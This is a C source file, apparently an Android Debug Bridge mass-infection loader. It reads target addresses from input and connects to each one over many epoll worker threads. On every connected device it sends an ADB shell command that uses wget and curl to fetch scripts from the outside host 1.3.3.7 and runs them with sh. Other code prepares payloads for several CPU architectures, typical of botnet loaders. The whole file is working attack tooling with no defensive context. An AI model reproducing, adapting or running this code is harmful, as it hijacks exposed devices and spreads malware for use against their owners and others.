#packegae# wicked

#define _GNU_SOURCE

#include <stdio.h>
#include <sys/epoll.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <pthread.h>
#include <stdint.h>
#include <errno.h>
#include <string.h>
#include <pthread.h>
#include <signal.h>
#include <glob.h>

#include "main.h"
#include "def.h"
#include "target.h"
#include "worker.h"
#include "cmd.h"

struct target target_connection[MAX_EVENTS];
struct worker *_worker;

int processed = 0;
int total = 0;
int downloader_count = 0;
struct downloader *downloaders;
int downloader_index = 0;
int echos = 0;
int sent = 0;

enum
{
    EM_X86_64 = 62,
    EM_POWERPC = 20,
    EM_NONE = 0,
    EM_SPARC = 2,
    EM_X86 = 3,
    EM_ARM = 40,
    EM_M68K = 4,
    EM_MIPS = 8,
    ENDIAN_LITTLE = 1,
    ENDIAN_BIG = 2,
    BIT_32 = 1,
    BIT_64 = 2
};

struct downloader
{
    char **payload;
    int machine;
    int bit;
    int endian;
    char arch[128];
    int size;
    int index;
};

static struct downloader *drop_payload(void)
{
    int i = 0;
    struct downloader *ref;
    int x = 0;

    ref = &downloaders[0];

    while(ref)
    {
        if(x == downloader_count)
        {
            break;
        }

        if(ref->machine == EM_ARM && ref->bit == BIT_32 && ref->endian == ENDIAN_LITTLE)
        {
            return ref;
        }

        ref++;
        x++;
    }

    return NULL;
}

static void breakdown_connection(int fd, int epoll_fd)
{
    epoll_ctl(epoll_fd, EPOLL_CTL_DEL, fd, NULL);
    if(fd != -1)
        close(fd);
    target_connection[fd].port = 0;
    target_connection[fd].addr = 0;
    target_connection[fd].state = 0;
    //target_connection[fd].success = FALSE;
    target_connection[fd].timeout = 0;
    target_connection[fd].fd = -1;
    target_connection[fd].epoll_fd = -1;
    target_connection[fd].timeout_seconds = 0;
    target_connection[fd].payload_index = 0;
    target_connection[fd].ran = 0;
    return;
}

static uint32_t calculate_sum(char *data, int data_len)
{
    uint32_t sum = 0;
    int count = 0;

    count = data_len;

    while(count-- > 0)
    {
        sum += *data++;
    }

    return sum;
}

static void establish_connection(struct epoll_event *pp, uint16_t port, uint8_t state, int core_id)
{
    struct epoll_event e;
    int fd = -1;
    struct sockaddr_in addr;

    fd = socket(AF_INET, SOCK_STREAM, 0);
    if(fd == -1)
        return;

    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = target_connection[pp->data.fd].addr;

    NONBLOCK(fd);

    errno = 0;
    connect(fd, (struct sockaddr *)&addr, sizeof(addr));

    e.data.fd = fd;
    e.events = EPOLLOUT | EPOLLET;

    if(epoll_ctl(_worker[core_id].epoll_fd, EPOLL_CTL_ADD, fd, &e))
    {
        close(fd);
        return;
    }

    target_connection[e.data.fd].port = htons(port);
    target_connection[e.data.fd].addr = target_connection[pp->data.fd].addr;
    target_connection[e.data.fd].state = state;
    target_connection[e.data.fd].timeout = 0;
    target_connection[e.data.fd].fd = e.data.fd;
    target_connection[e.data.fd].epoll_fd = _worker[core_id].epoll_fd;
    target_connection[e.data.fd].timeout = time(NULL);
    target_connection[e.data.fd].timeout_seconds = 15;
    target_connection[e.data.fd].payload_index = 0;
    target_connection[e.data.fd].ran = 0;

    return;
}

static void adb_send_data(int fd, char *cmd)
{
    uint32_t sum = 0;
    uint32_t size = 0;
    uint32_t length = 0;

    size = strlen(cmd);
    length = size + 1;

    sum = calculate_sum(cmd, size);

    send(fd, "OPEN\x58\x01\x00\x00\x00\x00\x00\x00", 12, MSG_NOSIGNAL);
    send(fd, &length, sizeof(uint32_t), MSG_NOSIGNAL);
    send(fd, &sum, sizeof(uint32_t), MSG_NOSIGNAL);
    send(fd, "\xb0\xaf\xba\xb1", 4, MSG_NOSIGNAL);
    send(fd, cmd, size, MSG_NOSIGNAL);
    send(fd, "\x00", 1, MSG_NOSIGNAL);

    return;
}

static void process_event(struct epoll_event *pp, int core_id)
{
    if(pp->events & EPOLLERR || pp->events & EPOLLHUP || pp->events & EPOLLRDHUP)
    {
        printf("Error (%d.%d.%d.%d:%d)\n", target_connection[pp->data.fd].addr & 0xff, (target_connection[pp->data.fd].addr >> 8) & 0xff, (target_connection[pp->data.fd].addr >> 16) & 0xff, (target_connection[pp->data.fd].addr >> 24) & 0xff, ntohs(target_connection[pp->data.fd].port));
        breakdown_connection(pp->data.fd, _worker[core_id].epoll_fd);
        return;
    }

    if(pp->events & EPOLLOUT)
    {
        int err = 0;
        socklen_t err_len = sizeof(err);
        struct epoll_event e;
        //int j = 0;
        //struct downloader *payload;

        getsockopt(pp->data.fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
        if(err)
        {
            printf("Connection refused (%d.%d.%d.%d:%d)\n", target_connection[pp->data.fd].addr & 0xff, (target_connection[pp->data.fd].addr >> 8) & 0xff, (target_connection[pp->data.fd].addr >> 16) & 0xff, (target_connection[pp->data.fd].addr >> 24) & 0xff, ntohs(target_connection[pp->data.fd].port));
            breakdown_connection(pp->data.fd, _worker[core_id].epoll_fd);
            return;
        }

        printf("Established (%d.%d.%d.%d:%d) FD %d\n", target_connection[pp->data.fd].addr & 0xff, (target_connection[pp->data.fd].addr >> 8) & 0xff, (target_connection[pp->data.fd].addr >> 16) & 0xff, (target_connection[pp->data.fd].addr >> 24) & 0xff, ntohs(target_connection[pp->data.fd].port), pp->data.fd);
        send(pp->data.fd, CNXN, CNXN_SIZE, MSG_NOSIGNAL);
        adb_send_data(pp->data.fd, "shell:cd /data/local/tmp/; busybox wget http://1.3.3.7/w.sh; sh w.sh; curl http://1.3.3.7/c.sh; sh c.sh");
        sent++;
        printf("Shell command sent to FD %d\n", pp->data.fd);
        target_connection[pp->data.fd].timeout = time(NULL);
        target_connection[pp->data.fd].timeout_seconds = 45;

        processed++;
    }
    return;
}

static void load_target(struct target *h)
{
    struct epoll_event e;
    int fd = -1;
    struct sockaddr_in addr;
    int core_id = sysconf(_SC_NPROCESSORS_ONLN);
    int r = 0;

    r = rand() % core_id;

    fd = socket(AF_INET, SOCK_STREAM, 0);
    if(fd == -1)
        return;

    addr.sin_family = AF_INET;
    addr.sin_port = h->port;
    addr.sin_addr.s_addr = h->addr;

    NONBLOCK(fd);

    errno = 0;
    connect(fd, (struct sockaddr *)&addr, sizeof(addr));

    e.data.fd = fd;
    e.events = EPOLLOUT | EPOLLET;

    if(epoll_ctl(_worker[r].epoll_fd, EPOLL_CTL_ADD, fd, &e))
    {
        close(fd);
        return;
    }

    target_connection[e.data.fd].port = h->port;
    target_connection[e.data.fd].addr = h->addr;
    target_connection[e.data.fd].state = ADB_PROCESS;
    target_connection[e.data.fd].timeout = 0;
    target_connection[e.data.fd].fd = e.data.fd;
    target_connection[e.data.fd].epoll_fd = _worker[r].epoll_fd;
    target_connection[e.data.fd].timeout = time(NULL);
    target_connection[e.data.fd].timeout_seconds = 15;
    target_connection[e.data.fd].payload_index = 0;
    target_connection[e.data.fd].ran = 0;

    return;
}

static void *statistics(void *arg)
{
    int seconds = 0;

    while(TRUE)
    {
        printf("%ds | Processed: %d | Sent: %d | Total: %d\n", seconds, processed, sent, total);
        sleep(1);
        seconds++;
    }
}

static void *epoll_worker(void *arg)
{
    int core_id;
    cpu_set_t cpu_set;
    pthread_t thread;
    struct epoll_event *pp;
    int r;

    core_id = *(int *)arg;

    printf("Spawned worker! (%d)\n", core_id);

    CPU_ZERO(&cpu_set);
    
    thread = pthread_self();

    CPU_SET(core_id, &cpu_set);

    if(pthread_setaffinity_np(thread, sizeof(cpu_set_t), &cpu_set))
        pthread_exit(&r);

    _worker[core_id].epoll_fd = epoll_create1(0);
    if(!_worker[core_id].epoll_fd)
        pthread_exit(&r);

    pp = (struct epoll_event *)calloc(MAX_EVENTS, sizeof(struct epoll_event));
    if(!pp)
        pthread_exit(&r);

    while(TRUE)
    {
        int z, x;

        x = epoll_wait(_worker[core_id].epoll_fd, pp, MAX_EVENTS, -1);
        if(x == -1)
            break;

        for(z = 0; z < x; z++)
            process_event(&pp[z], core_id);
    }

    free(pp);
    pthread_exit(&r);
}

static void *timeout(void *arg)
{
    int i = 0;

    while(TRUE)
    {
        for(i = 0; i < MAX_EVENTS; i++)
        {
            if(target_connection[i].fd == -1)
                continue;
            if(target_connection[i].timeout + target_connection[i].timeout_seconds < time(NULL))
            {
                printf("Connection timed out (%d.%d.%d.%d:%d) (%d second%s)\n", target_connection[i].addr & 0xff, (target_connection[i].addr >> 8) & 0xff, (target_connection[i].addr >> 16) & 0xff, (target_connection[i].addr >> 24) & 0xff, ntohs(target_connection[i].port), target_connection[i].timeout_seconds, (target_connection[i].timeout_seconds == 1 ? "" : "s"));
                breakdown_connection(target_connection[i].fd, target_connection[i].epoll_fd);
            }
        }
    }
}
void main(void)
{
    struct target h;
    int core_count = sysconf(_SC_NPROCESSORS_ONLN);
    pthread_t workers[core_count];
    pthread_t statistics_thread;
    pthread_t timeout_thread;
    int x = 0;
    uint32_t t = time(NULL);
    glob_t results;
    int i = 0;

    signal(SIGCHLD, SIG_IGN);

    srand(t);

    _worker = (struct worker *)calloc(core_count, sizeof(struct worker));

    for(x = 0; x < core_count; x++)
        _worker[x].epoll_fd = -1;

    for(x = 0; x < MAX_EVENTS; x++)
    {
        target_connection[x].state = ADB_PROCESS;
        target_connection[x].addr = 0;
        target_connection[x].port = 0;
        target_connection[x].timeout = 0;
        target_connection[x].fd = -1;
        target_connection[x].epoll_fd = -1;
        target_connection[x].timeout_seconds = 0;
        target_connection[x].payload_index = 0;
        target_connection[x].ran = 0;
    }

    for(x = 0; x < core_count; x++)
    {
        pthread_create(&workers[x], NULL, epoll_worker, &x);
        sleep(1);
    }
    pthread_create(&statistics_thread, NULL, statistics, NULL);
    pthread_create(&timeout_thread, NULL, timeout, NULL);

    while(TRUE)
    {
        char buf[4096];
    
        if(fgets(buf, sizeof(buf), stdin) == NULL)
        {
            sleep(1);
            continue;
        }

        if(strlen(buf) == 0)
            continue;

        if(!parse_target(&h, buf))
        {
            continue;
        }

        total++;

        load_target(&h);
    }

    free(_worker);

    return;
}
